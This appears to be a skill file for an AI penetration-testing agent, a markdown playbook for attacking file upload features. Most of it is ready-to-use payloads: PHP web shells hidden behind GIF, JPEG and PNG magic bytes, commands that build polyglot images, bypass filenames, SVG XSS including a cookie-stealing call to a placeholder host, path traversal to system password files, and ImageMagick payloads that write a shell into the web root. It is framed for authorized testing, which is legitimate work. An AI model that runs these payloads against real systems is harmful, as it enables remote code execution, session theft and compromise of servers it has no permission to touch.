---
name: file-upload-attacks
description: "File upload exploitation including double extension, polyglot files, SVG XSS, and restricted file bypass"
category: specialized
tier: balanced
toolRefs: [httpRequest, parseResponse, evaluateRendered, updateGraph, writeFinding, followRedirects, recordEvidence, getCapturedHeaders]
triggers: ["file upload vulnerability", "upload exploitation", "unrestricted file upload", "file type bypass", "upload bypass", "double extension", "polyglot file", "svg upload", "image upload attack", "upload validation bypass"]
contextBoosts: [api]
mitreAttack: ["T1190", "T1059"]
owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
---

# File Upload Attacks

## When to Use
- Testing file upload functionality for unrestricted upload, type bypass, or path traversal
- Assessing SVG uploads for XSS
- Testing image processing libraries for vulnerabilities

**Do not use** to deploy actual malicious files in production. Prove the flaw, don't weaponize.

## Auth Context
Before making HTTP requests, call **getCapturedHeaders** with the target URL to get real auth context. Pass these in the `headers` parameter of httpRequest.

## Upload Field Discovery
```
POST /api/upload
POST /api/files/upload
POST /api/attachments
POST /api/import
POST /upload
POST /admin/upload
POST /api/user/avatar
POST /api/documents

# HTML upload forms
<input type="file" name="file">
<input type="file" name="attachment" accept=".jpg,.png" hidden>
```

## Double Extension Bypass
```
shell.php.jpg
shell.php.png
shell.phtml.jpg

# Null byte injection
shell.php%00.jpg

# Semicolon injection (IIS)
shell.php;.jpg

# Case variation
shell.pHp
shell.pHP
```

## Content-Type Bypass
```
# Change MIME type to allowed type
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif

# Null byte in Content-Type
Content-Type: image/jpeg%00
```

## Magic Bytes Bypass
```
# GIF89a header
GIF89a<?php echo shell_exec($_GET['cmd']); ?>

# JPEG header
FF D8 FF E0<?php echo shell_exec($_GET['cmd']); ?>

# PNG header
89 50 4E 47 0D 0A 1A 0A<?php echo shell_exec($_GET['cmd']); ?>
```

## Polyglot Files
```
# JPEG + PHP polyglot using EXIF data
exiftool -Comment='<?php echo shell_exec($_GET["cmd"]); ?>' image.jpg
# Rename to image.php.jpg

# PNG + PHP polyglot
python -c "import sys; sys.stdout.buffer.write(open('image.png','rb').read() + b'<?php echo shell_exec($_GET[\"cmd\"]); ?>')" > shell.php.png
```

## SVG XSS Upload
```xml
<!-- Basic SVG XSS -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<!-- SVG with external resource -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="https://YOUR-OAST/steal?cookie=" />
</svg>

<!-- SVG with foreignObject -->
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="200" height="200">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <script>alert(1)</script>
    </body>
  </foreignObject>
</svg>
```

## Path Traversal in Filename
```
../../../etc/cron.d/shell
..%2f..%2f..%2fetc%2fpasswd

# Windows path traversal
..\..\..\windows\system32\config\sam

# Double URL encoding
..%252f..%252f..%252fetc/passwd

# Null byte
../../../etc/passwd%00.jpg
```

## ImageMagick Exploitation (CVE-2016-3714)
```
# Delegate attack via crafted image
<image>
  <delegate>%s</delegate>
  <input>config</input>
</image>

# MSL bypass
<image>
  <read filename="ephemeral:/tmp/test.php" />
  <write filename="/var/www/html/shell.php" />
</image>
```

## Race Condition on Upload
```
# Upload and access before deletion
# Step 1: Upload file via POST
# Step 2: Immediately access the uploaded file (before async validation deletes it)
# Step 3: If timing is right, execute before deletion

# Concurrent uploads
# Send multiple upload requests simultaneously
# Some may bypass validation due to race condition
```

## Evidence Collection
- Upload request/response pairs
- Evidence of file execution (command output, XSS alert)
- File storage path discovery
- **recordEvidence** for every finding
- **writeFinding** with severity based on impact

## Anti-Hallucination
Your claims will be verified against real tool output. Never fabricate findings.
Every upload bypass you report MUST have a corresponding tool call response that proves it.
If a tool call fails, say so honestly — do not invent a success.
